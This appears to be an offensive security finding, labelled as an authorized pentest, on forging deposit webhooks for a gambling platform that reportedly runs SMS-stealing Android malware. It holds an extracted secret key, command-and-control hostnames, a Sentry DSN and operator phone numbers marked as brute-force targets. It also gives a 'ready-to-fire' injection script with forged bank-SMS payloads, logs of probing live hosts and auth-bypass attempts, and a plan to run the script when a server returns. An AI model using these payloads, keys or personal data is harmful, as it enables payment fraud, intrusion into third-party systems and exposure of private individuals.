# TrueWallet → Luxino Platform Webhook Injection

**Classification:** AUTHORIZED PENTEST — asdgapicenterssdo.com  
**Finding:** F01/F13 chain — Deposit Forgery via SMS Webhook Injection  
**Date:** 2026-09-24  

---

## Overview

The Luxino gambling platform uses the **LuxSMS** Android malware suite to intercept real banking SMS messages from victims' phones and forward them as deposit confirmations to the casino backend. The C2 authentication uses a single hardcoded HMAC key (`PAPDIEAW-KEY`) extracted from the APK.

Knowledge of this key allows **forged deposit webhook injection** — creating synthetic "we received your bank transfer" events without any actual money movement.

---

## Architecture

```
Victim's Phone
     │  (KBank / SCB / TrueWallet SMS intercepted)
     ▼
LuxSMS Malware (silently running in background)
     │  POST /webhooks/sms/truewallet
     │  Header: PAPDIEAW-KEY: 649e854e...
     │  Body: {address, message, timestamp, phone_owner}
     ▼
C2: bot-auto.ztechdev.com   (or bot-auto.jokerslotz999.com)
     │  (parses Thai SMS → extracts amount, bank)
     │  POST {casino_webhook_url}/webhooks/sms/truewallet
     │  Header: Authorization: Bearer {bot_token}
     │  Header: papdieawKey: {PAPDIEAW-KEY}
     │  Body: ReadSmsRequest{address, amount, bank_code, bank_no, ...}
     ▼
Casino Backend (pbapi.asdgapicenterssdo.com)
     │  (validates PAPDIEAW-KEY + bot token)
     │  (credits deposit to operator's bank_no account)
     ▼
Deposit appears in player's pending queue → admin approves
```

---

## Extracted Secrets

| Secret | Value | Source |
|--------|-------|--------|
| `PAPDIEAW-KEY` | `649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80` | `ListApi.java:48` `@Headers` annotation |
| C2 login | `bot-auto.ztechdev.com` | `PrefUtil.baseUrlLogin` default |
| C2 webhook | `staging-bot.luxino.com` | `PrefUtil.baseUrl` default (DNS dead) |
| C2 backup | `bot-auto.jokerslotz999.com` | `assets/login` mock response |
| C2 legacy | `bot.luxino.com` | Early APK versions |
| Sentry DSN | `https://bfbf5a0d3c6d4223816e5afb78c8a0c8@o476342.ingest.sentry.io/5515799` | `AndroidManifest.xml` |
| Firebase project | `we88zz` | `google-services.json` |

---

## APK API Interfaces

### `ListApi.java` — Relevant Methods

```java
// To C2 — only PAPDIEAW-KEY, no Authorization
@Headers({"Content-Type: application/json;charset=UTF-8",
          "PAPDIEAW-KEY:649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"})
@POST("/webhooks/sms/truewallet")
Observable<SendSmsResponse> SendSms(@Body SendSmsRequest sendSmsRequest);

// To casino backend directly — both headers required
@POST  // dynamic URL from pref.getTrueUrl()
Observable<ReadSmsResponse> ReadSmstrueWallet(
    @Url String url,
    @Header("Authorization") String Authorization,  // bot's C2 session token
    @Header("papdieawKey") String papdieawKey,      // PAPDIEAW-KEY
    @Body ReadSmsRequest response
);
```

### `SendSmsRequest` Body (to C2)

```json
{
  "address":     "TrueMoney Wallet",
  "message":     "TrueMoney Wallet: รับเงิน 10000.00 บาท จาก 0972571110 เมื่อวันที่ 24/09/26 08:10 น. ยอดคงเหลือ 15000.00 บาท",
  "timestamp":   1727136000000,
  "phone_owner": "0963917854"
}
```

### `ReadSmsRequest` Body (to casino backend via C2)

```json
{
  "address":   "TrueMoney Wallet",
  "amount":    "10000",
  "bank_code": "TRUEWALLET",
  "bank_no":   "0963917854",
  "message":   "...",
  "password":  "",
  "sms_id":    "tw_1727136001",
  "timestamp": 1727136000000,
  "type":      "true",
  "username":  ""
}
```

---

## Exploit Script

**Ready-to-fire:** `/tmp/webhook_inject_c2.py`

```python
# Headers (from @Headers annotation — no Authorization needed for C2)
headers = {
    "Content-Type": "application/json;charset=UTF-8",
    "PAPDIEAW-KEY": "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80",
}

# Body (SendSmsRequest format)
body = {
    "address":     "TrueMoney Wallet",
    "message":     f"TrueMoney Wallet: รับเงิน {AMOUNT} บาท จาก {SENDER} เมื่อวันที่ ...",
    "timestamp":   int(time.time() * 1000),
    "phone_owner": "0963917854",  # operator's registered phone
}

# C2 endpoints (try in order)
POST https://bot-auto.ztechdev.com/webhooks/sms/truewallet
POST https://bot-auto.jokerslotz999.com/webhooks/sms/truewallet
```

---

## Current Status

| C2 | Status | Last checked |
|----|--------|-------------|
| `af6efb584a3d317b5a11ab6209b88e1b.xyzwalldetop.com` | ⚠️ LIVE — Cloudflare bot challenge | 2026-10-06 07:30 |
| `bot-auto.ztechdev.com` | ❌ 521 (origin down) | 2026-09-24 08:43 |
| `bot-auto.jokerslotz999.com` | ❌ Timeout | 2026-09-24 08:43 |
| `bot.luxino.com` | ❌ 530 | 2026-09-18 |

**New C2 (2026-10-06):** `af6efb584a3d317b5a11ab6209b88e1b.xyzwalldetop.com` — found via F14 bgapi BOLA on `/bo/info/general-config`. Per-tenant subdomains (`{TID}.xyzwalldetop.com`). Live but Cloudflare blocks automated probing. Bot token not yet extracted.

---

## Webhook Route Availability Per Tenant (2026-09-24)

| Tenant | Hash | Webhook `/webhooks/sms/truewallet` | Note |
|--------|------|-----------------------------------|------|
| wee88z | `54ef7626cb381f4bab8be91f0cdbce47` | ✅ Route exists (401 = auth checked) | Needs bot token |
| slxoz1688 | `09b2c3ab78fa9e070e9b0517ed1508d5` | ✅ Route exists (401 = auth checked) | Needs bot token |
| ufa24max | `6d25d6ebf6e4eedf09d9687dc5ca1440` | ✅ Route exists (401 = auth checked) | Needs bot token |
| vak88z2 | `af6efb584a3d317b5a11ab6209b88e1b` | ❌ Route NOT registered (404) | Route not deployed |

**Key finding**: Player JWTs (player auth) → 401 on webhook endpoints, even on the player's own tenant. The webhook requires a special "bot token" separate from player JWTs. The bot token is provisioned by the C2's `/service/authenticate` endpoint.

---

## Bot Token Auth Model

The casino webhook handler checks **two** things:
1. `papdieawKey` header = PAPDIEAW constant ✅ (known)
2. `Authorization: Bearer {bot_token}` — NOT a player JWT. Bot tokens are issued by C2 on successful `/service/authenticate` (username+password). Format/secret unknown.

Tested and **rejected** on wee88z/slxoz/ufa24max:
- Player JWTs (any tenant, valid signature) → 401
- PAPDIEAW as bearer token → 401
- PAPDIEAW-signed custom JWTs (various payloads) → 401
- Firebase idToken → 401

The bot token is the only remaining blocker. The C2 must come back online to extract it, OR the bot token format must be reverse-engineered from the APK's `/service/authenticate` response handling.

---

## Operator Phone Numbers (phone_owner)

| Tenant | Operator Phone | Evidence |
|--------|---------------|----------|
| vak88z2 | `0963917854` | OTP brute target, operator account |
| vak88z2 | `0801310755` | APK SharedPref default phone |
| slxoz1688 | `0940694315` | OTP brute target, operator account |

---

## Attack Conditions

- **When C2 comes online**: Run `python3 /tmp/webhook_inject_c2.py`
- **Amount**: Any — the C2 parses from the Thai SMS `message` field
- **Direction**: Fake SMS from any victim number → `phone_owner` receives deposit credit
- **Per C2 check-in**: C2 distributes this to the right casino tenant automatically based on `phone_owner`

---

## Direct Casino Backend Path (Blocked)

Attempting to call `{tenant}pbapi.asdgapicenterssdo.com/webhooks/sms/truewallet` directly requires:
1. `papdieawKey: {PAPDIEAW-KEY}` header ✅ (known)
2. `Authorization: Bearer {bot_token}` ❌ (bot token provisioned by C2 — C2 offline)

Player JWTs / Firebase tokens / PAPDIEAW-as-bearer all rejected (401).
vak88z2 appears to return 404 (not 401) — route simply not deployed there; auth doesn't run.

---

## Recommendations (for report)

1. **Rotate PAPDIEAW-KEY immediately** — hardcoded in APK binary, public
2. **Take C2 infrastructure offline permanently** — remove malware distribution
3. **Add IP allowlist for webhook endpoints** — only C2 IPs should call `/webhooks/sms/`
4. **Replace SMS-based deposit confirmation** with real bank API verification (PromptPay QR clearing)
